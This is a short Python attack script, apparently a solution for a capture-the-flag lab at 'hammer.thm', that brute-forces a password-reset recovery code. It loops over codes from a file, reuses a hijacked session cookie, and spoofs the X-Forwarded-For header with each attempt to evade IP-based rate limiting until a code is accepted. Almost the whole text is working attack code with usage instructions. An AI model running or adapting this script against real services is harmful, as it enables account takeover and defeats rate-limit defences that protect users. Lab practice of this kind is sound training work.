import sys, requests, json

REQUEST_BODY = [
    {
        "Conten-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": "__SRC_IP__",
        "Cookie": "__COOKIE__"
    },
    {
        "recovery_code": 0000,
        "s":150
    }
]


SESSION_COOKIE ='PHPSESSID='

def set_SESSION_COOKIE(cookie):
    global SESSION_COOKIE
    SESSION_COOKIE = SESSION_COOKIE + cookie

def check_otp(otp):
    url = 'http://hammer.thm:1337/reset_password.php'
    
    headers = REQUEST_BODY[0]
    data = REQUEST_BODY[1]
    
    data['recovery_code'] = otp
#    print(data)   

    headers['X-Forwarded-For'] = str(otp)
    headers['Cookie'] = headers['Cookie'].replace('__COOKIE__', SESSION_COOKIE)
#    print(headers)

    response = requests.post(url,headers=headers, data = data)

    return response


def brute_force_otp(otp_file):
    otp_codes = []
    error_message = 'Invalid'
    with open(otp_file, 'r') as file:
        otp_codes = file.readlines()

    for otp_code in otp_codes:
        otp_code = otp_code.strip()
        
        response = check_otp(otp_code)
        if not response: return
        elif error_message in response.text:
            print(f'[INVALID CODE] {otp_code}')
        else:
            print(f'-----> [FOUND VALID CODE] {otp_code}')
            break

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f'Invalid command. <Usage>: python3 brute_force_otp $OTP_FILE $SESSION_COOKIE')
        sys.exit(1)
    
    cookie = sys.argv[2]
    otp_file = sys.argv[1]

    set_SESSION_COOKIE(cookie)
    #response = check_otp(1234)
    brute_force_otp(otp_file)

    #print(response)
